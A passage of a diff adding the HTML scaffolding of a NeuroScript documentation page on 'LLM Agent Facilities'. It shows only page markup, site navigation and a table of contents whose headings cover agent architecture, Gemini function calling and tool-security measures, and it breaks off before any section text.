@@ -1,0 +1,3720 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://aprice2704.github.io/neuroscript/llm_agent_facilities/">
+      
+      
+        <link rel="prev" href="../neurodata_and_composite_file_spec/">
+      
+      
+        <link rel="next" href="../restricted_mode/">
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.12">
+    
+    
+      
+        <title>LLM Agent Facilities - NeuroScript</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.2afb09e1.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#plan-for-evolving-neurogo-into-a-secure-llm-agent" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="NeuroScript" class="md-header__button md-logo" aria-label="NeuroScript" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            NeuroScript
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              LLM Agent Facilities
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/aprice2704/neuroscript" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="NeuroScript" class="md-nav__button md-logo" aria-label="NeuroScript" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    NeuroScript
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/aprice2704/neuroscript" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Home
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../RoadMap/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Road Map
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Overview
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Overview
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../front/why-ns/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Why NeuroScript
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../front/architecture/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Architecture
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../front/concepts/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Core Concepts
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../front/installation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Installation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../front/faq/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    FAQ
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../front/contributing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Contributing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Specifications
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            Specifications
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../script_spec/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Quick Spec
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../formal%20script%20spec/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Formal Spec
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../metadata/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Metadata
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../neurodata_and_composite_file_spec/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    NeuroData & Composite
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    LLM Agent Facilities
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    LLM Agent Facilities
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      Introduction
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Introduction">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#purpose" class="md-nav__link">
+    <span class="md-ellipsis">
+      Purpose
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#concept-recap" class="md-nav__link">
+    <span class="md-ellipsis">
+      Concept Recap
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#criticality-of-security" class="md-nav__link">
+    <span class="md-ellipsis">
+      Criticality of Security
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scope-and-structure" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scope and Structure
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#section-1-proposed-architecture-for-neurogo-as-llm-agent" class="md-nav__link">
+    <span class="md-ellipsis">
+      Section 1: Proposed Architecture for NeuroGo-as-llm-agent
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Section 1: Proposed Architecture for NeuroGo-as-llm-agent">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#11-architectural-overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      1.1. Architectural Overview
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#12-core-components" class="md-nav__link">
+    <span class="md-ellipsis">
+      1.2. Core Components
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#13-interaction-flow-detailed-cycle" class="md-nav__link">
+    <span class="md-ellipsis">
+      1.3. Interaction Flow (Detailed Cycle)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#section-2-llm-interaction-protocol-via-gemini-function-calling" class="md-nav__link">
+    <span class="md-ellipsis">
+      Section 2: LLM Interaction Protocol via Gemini Function Calling
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Section 2: LLM Interaction Protocol via Gemini Function Calling">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#21-primary-mechanism-gemini-api-function-calling" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.1. Primary Mechanism: Gemini API Function Calling
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#22-data-structures" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.2. Data Structures
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#23-handling-multipleparallel-tool-calls" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.3. Handling Multiple/Parallel Tool Calls
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#24-function-calling-mode-configuration" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.4. Function Calling Mode Configuration
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#25-fallback-strategy-structured-data-in-chat" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.5. Fallback Strategy (Structured Data in Chat)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#section-3-implementation-plan-for-neurogo-modifications-go" class="md-nav__link">
+    <span class="md-ellipsis">
+      Section 3: Implementation Plan for NeuroGo Modifications (Go)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Section 3: Implementation Plan for NeuroGo Modifications (Go)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#31-llmgo-adaptations" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.1. llm.go Adaptations
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#32-conversation-state-management" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.2. Conversation State Management
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#33-secure-tool-dispatch-mechanism" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.3. Secure TOOL Dispatch Mechanism
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#34-tool-refactoring-for-security" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.4. TOOL Refactoring for Security
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#35-agent-mode-configuration" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.5. Agent Mode Configuration
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#section-4-critical-security-design" class="md-nav__link">
+    <span class="md-ellipsis">
+      Section 4: Critical Security Design
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Section 4: Critical Security Design">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#41-tool-allowlisting" class="md-nav__link">
+    <span class="md-ellipsis">
+      4.1. TOOL Allowlisting
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#42-strict-argument-validation-and-sanitization" class="md-nav__link">
+    <span class="md-ellipsis">
+      4.2. Strict Argument Validation and Sanitization
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#43-mandatory-path-sandboxing" class="md-nav__link">
+    <span class="md-ellipsis">
+      4.3. Mandatory Path Sandboxing
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#44-high-risk-tool-restrictiondisabling" class="md-nav__link">
+    <span class="md-ellipsis">
+      4.4. High-Risk Tool Restriction/Disabling
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#45-inputoutput-filtering-defense-in-depth" class="md-nav__link">
+    <span class="md-ellipsis">
+      4.5. Input/Output Filtering (Defense in Depth)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#46-security-measures-summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      4.6. Security Measures Summary
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#section-5-key-challenges-risks-and-mitigation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Section 5: Key Challenges, Risks, and Mitigation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Section 5: Key Challenges, Risks, and Mitigation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#51-security-vulnerabilities" class="md-nav__link">
+    <span class="md-ellipsis">
+      5.1. Security Vulnerabilities
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#52-llm-reliability-issues" class="md-nav__link">
+    <span class="md-ellipsis">
+      5.2. LLM Reliability Issues
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#53-state-management-complexity" class="md-nav__link">
+    <span class="md-ellipsis">
+      5.3. State Management Complexity
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#54-performance-considerations" class="md-nav__link">
+    <span class="md-ellipsis">
+      5.4. Performance Considerations
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#55-riskchallenge-analysis-summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      5.5. Risk/Challenge Analysis Summary
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#section-6-phased-development-and-testing-milestones" class="md-nav__link">
+    <span class="md-ellipsis">
+      Section 6: Phased Development and Testing Milestones
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Section 6: Phased Development and Testing Milestones">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#61-phase-1-foundational-implementation-focus-core-loop-basic-security" class="md-nav__link">
+    <span class="md-ellipsis">
+      6.1. Phase 1: Foundational Implementation (Focus: Core Loop &amp; Basic Security)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#62-phase-2-security-hardening-and-tool-expansion-focus-robustness-capability" class="md-nav__link">
+    <span class="md-ellipsis">
+      6.2. Phase 2: Security Hardening and Tool Expansion (Focus: Robustness &amp; Capability)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#63-phase-3-refinement-and-advanced-features-focus-usability-performance-testing" class="md-nav__link">
+    <span class="md-ellipsis">
+      6.3. Phase 3: Refinement and Advanced Features (Focus: Usability, Performance, Testing)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#section-7-alignment-with-neuroscript-bootstrapping-goal" class="md-nav__link">
+    <span class="md-ellipsis">
+      Section 7: Alignment with NeuroScript Bootstrapping Goal
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Section 7: Alignment with NeuroScript Bootstrapping Goal">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#71-enabling-self-development-tasks" class="md-nav__link">
+    <span class="md-ellipsis">
+      7.1. Enabling Self-Development Tasks
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#72-secure-orchestration-layer" class="md-nav__link">
+    <span class="md-ellipsis">
+      7.2. Secure Orchestration Layer
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#73-accelerating-the-bootstrapping-roadmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      7.3. Accelerating the Bootstrapping Roadmap
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Conclusion
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Conclusion">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#summary-of-plan" class="md-nav__link">
+    <span class="md-ellipsis">
+      Summary of Plan
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#emphasis-on-security" class="md-nav__link">
+    <span class="md-ellipsis">
+      Emphasis on Security
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#next-steps" class="md-nav__link">
+    <span class="md-ellipsis">
+      Next Steps
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#section-8-gemini-25-discussion-llm-interaction-api-llm-neurogo-request" class="md-nav__link">
+    <span class="md-ellipsis">
+      Section 8: Gemini 2.5 Discussion: LLM Interaction API (LLM -&gt; NeuroGo Request)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-conversation-state-management" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Conversation State Management
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-security-limiting-actions" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. Security &amp; Limiting Actions
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../restricted_mode/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Restricted Mode
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../specification_structure/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Spec Structure Guide
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    NeuroData Types
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            NeuroData Types
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NeuroData/checklist/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Checklist
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NeuroData/cryptographic/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Cryptographic
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NeuroData/decision_table/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Decision Table
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NeuroData/enum/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Enum
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NeuroData/form/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Form
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NeuroData/geometry/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Geometry
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NeuroData/graph/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Graph
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NeuroData/list/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    List
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NeuroData/map_literal/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Map Literal
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
